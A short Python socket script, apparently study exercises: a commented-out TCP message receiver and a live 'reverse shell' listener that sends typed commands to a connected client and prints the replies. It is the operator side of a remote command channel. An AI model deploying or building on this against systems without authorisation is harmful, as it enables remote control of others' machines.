import socket

# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    # IPv4, UDP

"""
    Ex.1 receive bytes from client
"""
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # IPv4, TCP
# s.bind(('127.0.0.1', 8888))
# s.listen(5)
#
# while True:
#     try:
#         client, addr = s.accept()
#     except KeyboardInterrupt:
#         s.close()
#         break
#     else:
#         result = client.recv(1024)
#         print(f"Address: {addr}\nMessage: {result.decode('utf-8')}")

"""
    Ex.2 reverse shell
"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8888))
s.listen(5)
client, addr = s.accept()

while True:
    command = str(input('Type your command: '))
    client.send(command.encode())
    if command.lower() == 'exit':
        break
    result_output = client.recv(1024).decode()
    print(result_output)
client.close()
s.close()
